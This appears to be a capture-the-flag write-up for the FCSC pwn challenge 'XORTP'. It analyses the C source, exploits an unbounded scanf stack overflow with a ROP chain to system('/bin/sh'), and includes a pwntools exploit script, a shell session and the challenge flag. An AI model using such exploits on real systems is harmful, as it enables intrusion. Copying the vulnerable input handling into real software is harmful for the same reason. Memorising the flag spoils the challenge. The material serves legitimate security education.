+++
date = '2025-04-27T14:23:22+02:00'
draft = false 
title = 'XORTP'
tags = [ "pwn" ]
+++

Title: XORTP  
Points: 200  
Number of solves: 146  
Description: You can encrypt any file on the system with an unbreakable mechanism worthy of the greatest!  

We are provided with the source code of the challenge and a compiled executable.  

Ok so the code contains 3 functions including a `main`.  
```c
ssize_t
get_otp(unsigned char *k, const size_t n)
{
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0) {
    	return -1;
    }

    if (read(fd, k, n) < 0) {
        close(fd);
    	return -1;
    }

    close(fd);
    return n;
}
```

This `get_otp` (otp meaning one time password) function reads `n` bytes of data from `/dev/urandom` into the buffer pointed by `k` which provides a random encryption key to the program.  

```c
ssize_t
read_file(char *fn, unsigned char *m)
{
    int fd = open(fn, O_RDONLY);
    if (fd < 0) {
    	return -1;
    }

    ssize_t n = read(fd, m, BUF_SIZE);
    if (n < 0) {
    	return -1;
    }

    close(fd);
    return n;
}
```

The `read_file` function does exactly what the name implies : it reads `BUF_SIZE` of data from the file which name is in `fn` into the buffer pointed by `m`. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#define BUF_SIZE 128


int
main()
{
    char filename[BUF_SIZE];
    unsigned char m[BUF_SIZE];
    unsigned char k[BUF_SIZE];

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    system("ls -ld *");

    printf("Which file would like to encrypt?\n");
    scanf("%s", filename);

    ssize_t length = read_file(filename, m);
    if (length < 0) {
        printf("Error: read_file\n");
    	return 0;
    }

    if (get_otp(k, length) < 0) {
        printf("Error: get_otp\n");
    	return 0;
    }

    // Output the XOR result
    for (ssize_t i = 0; i < length; ++i) {
    	printf("%02x", m[i] ^ k[i]);
    }
    printf("\n");

    return 0;
}
```

Now for the `main` part this displays the content of the current directory then reads a filename from the user and outputs up to the first 128 bytes xored with a random key.  
```
>>> nc chall.fcsc.fr 2105
-r-------- 1 ctf ctf     71 Apr 13 21:36 flag.txt
-r-x------ 1 ctf ctf 899704 Apr 13 21:36 xortp
Which file would like to encrypt?
flag.txt
9eec55fe66cc73bf87ea8d4decd037f715b697ededdfa40f1373b9dc47a0cef4bad96dd14a732ef32dddd5b11c8fcd3a93eb2f38dad24d19c1bca549d44e71b65ac4cfa53858b9
```

Routine checksec for some information.
```
>>> pwn checksec --file xortp
[*] '/home/furtest/files/hacking/ctf/fcsc/pwn/XORTP/xortp'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```


The encryption logic does not have any obvious flaws however we notice that there is no bound check on the filename `scanf("%s", filename);`  
The size of the buffer for filename is `BUF_SIZE` = 128  
Now how can we exploit this ? It is possible to send `filename\x00aaaa...` to input filename and make the file reading work and then trigger a segfault because we overwrote the return pointer.  

Wait `segmentation fault` ? Checksec said that there is a stack canary the error should have been `stack smashing detected`. We can take a quick look at the decompiled binary in ghidra and indeed there is no canary on the main function. (This took me an embarrassingly long time to notice)   
Once we know that we need to take advantage of our capacity to control the return pointer of `main`. We cannot really take advantage of the functions in the program so we will try to perform a ret2libc and execute `system`.  

One more cool thing that will make everything a lot easier : the binary is statically linked 
```
>>> file xortp
xortp: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=e63dc8ebb3de92c338be2ed7f0590fbbbabd94f6, for GNU/Linux 3.2.0, not stripped
```

So the binary is statically linked and PIE (position independant executabled) is disabled. Calling function is therefore just a matter of finding their address in the executable.  
We will to try to call `system("/bin/sh")` to do that we find a `/bin/sh` string at address `0x498213` and the `system` function at address `0x40a3c0`.

To execute it we need to put a pointer to `/bin/sh` in `rdi` as per the x86-64 ABI.  
We will use a rop (return oriented programming) gadget to do so.
```
>>> ropper -f xortp --search "pop rdi; ret;"
0x0000000000401f60: pop rdi; ret; 
```

So recapitulating where we are :
- We have a buffer overflow on the filename input
- We can use it to overwrite the return pointer 
- The binary is statically linked and PIE is disabled
- We have the address of a `/bin/sh` string a rop gadget to load it in `rdi` and the address of `system`.

The next step is to write a nice little pwntools script to put all of that together.

```python
io = start()

system = 0x40a3c0
binsh = 0x498213

# Find the rop gadget
rop = ROP(elf)
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]

payload = flat(
        b"flag.txt\x00",
        b"A"*(145-2),
        pack(POP_RDI),
        pack(binsh),
        pack(system),
        pack(0x0)
        )

print(io.recvline().decode(), end="")
print(io.recvline().decode(), end="")
io.sendlineafter(b'Which file would like to encrypt?\n', payload)
print(io.recvline().decode(), end="")

io.interactive()
```

We run the script and tadam : `[1]    17615 segmentation fault (core dumped)`  
Hum looks like I forgot to take stack alignment into account (I ran the exploit in gdb to figure it out).  

So I need to make the stack 16 bytes aligned (ie `rsp` must be modulo 16).  
After manually stepping through the code we can see that one of the first instructions executed by `system` is `push r13` which changes `rsp` by 8 bytes.  
So instead of jumping to the start of `system` we jump after this `push` and our exploit works.

```
>>> ./exploit.py REMOTE
-r-------- 1 ctf ctf     71 Apr 13 21:36 flag.txt
-r-x------ 1 ctf ctf 899704 Apr 13 21:36 xortp
bf40d970d624855062f89d3f2e39c3c2c8370fabe53e304fd014e866cfee994353f58dfb3580170a3dd26342659f9035075d4ecd59da8324a7c841a4f2df6b88a40771d95b3fa7
$ ls
flag.txt
xortp
$ cat flag.txt
FCSC{5f6162c46e47b68ad0d1b4a5e12404ad51431b197e37ff79ef940787fecfb554}
```
